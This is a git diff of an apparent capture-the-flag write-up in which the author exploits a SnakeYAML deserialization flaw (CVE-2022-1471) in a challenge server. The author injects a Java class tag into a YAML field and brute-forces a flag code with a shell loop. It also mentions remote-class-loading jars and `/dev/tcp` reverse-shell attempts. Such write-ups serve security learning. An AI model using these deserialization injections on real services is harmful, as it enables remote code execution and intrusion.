@@ -28,7 +28,9 @@ resolution: 256x256
 ```
 
 It's a YAML with the info. I suspected I could inject some file name in `image:` like /flag.txt and be happy, but that was definitely not the case. 
+
 After googling a lot I came to know about [CVE-2022-1471](https://nvd.nist.gov/vuln/detail/CVE-2022-1471) and I quickly found some [PoCs](https://github.com/artsploit/yaml-payload/) promising RCEs and reverse shells using javax.net.URLClassLoader, which (for what I could make of it) should let you load an external Class by URL. 
+
 I spent all my day trying to achieve that, and although I could get the server to download my malicious .jar files, I never got it to run them, and oh boy, I tried.
 The payload I used to make the server download my exploit was:
 
@@ -43,6 +45,7 @@ I've tried jars to `ping`, `echo > /dev/tcp/` and a lot of other things, but the
 It took my a while to find out that the source code for the application was available, and although I'm no Java Programmer, I still know how to read. 
 
 There's a `Flag` class
+
 ```java
 package com.hackyeaster.digitalsnakeart;
 
@@ -59,6 +62,7 @@ public class Flag extends Image {
 ```
 
 that extends `Image`
+
 ```java
 package com.hackyeaster.digitalsnakeart;
 
@@ -82,7 +86,8 @@ public class Image {
 }
 ```
 
-I had to read more to understand the Code object (is it an object or a class? both? sorry idk) in Code.java
+I had to read more to understand the Code object (is it an object or a class? both? sorry idk) in `Code.java`
+
 ```java
 package com.hackyeaster.digitalsnakeart;
 
@@ -99,13 +104,15 @@ public class Code {
     }
 
 }
-```
-and that `isCorrect()` method (is it a method? I don't know java) is definitely inviting me to brute force something.
 
-So I thought:
-"Damn it. If I should be able to use that exploit to load external classes from an URL, how in hell wouldn't I be able to call classes, methods and objects ALREADY THERE?"
+```
+and that `isCorrect()` method (it's a method, right?) is definitely inviting me to brute force something.
+
+So I thought: "Damn it. If I should be able to use that exploit to load external classes from an URL, how in hell wouldn't I be able to call classes, methods and objects ALREADY THERE?"
+
 Gathering everything, it was clear to me that I should try to inject the `image:` key.
-Judging by the cover, I supposed it should start with something like `!!com.hackyeaster.digitalsnakeart.Flag [ ]`, so I started literally manually brute forcing words, positions, brackets, for hours! Until I got it right:
+
+Judging the CVE by the cover, I supposed it should start with something like `!!com.hackyeaster.digitalsnakeart.Flag [ ]`, so I started literally manually brute forcing words, positions, brackets, for hours! Until I got it right:
 
 ```yaml
 name: Snakes at the Beach
@@ -127,7 +134,9 @@ echo http://ch.hackyeaster.com:2307/art?art=$p
 <img width="548" alt="image" src="https://user-images.githubusercontent.com/2973929/234149549-8df39d96-b204-4ce8-b565-9066d96bff09.png">
 
 
+
 BAM! Different image! A snake with a lock!
+
 After tyring other codes, I was sure that every time I got the code wrong I would see that image. So I got its md5 and wrote a shell script to test every code from 1 to 499:
 
 ```bash
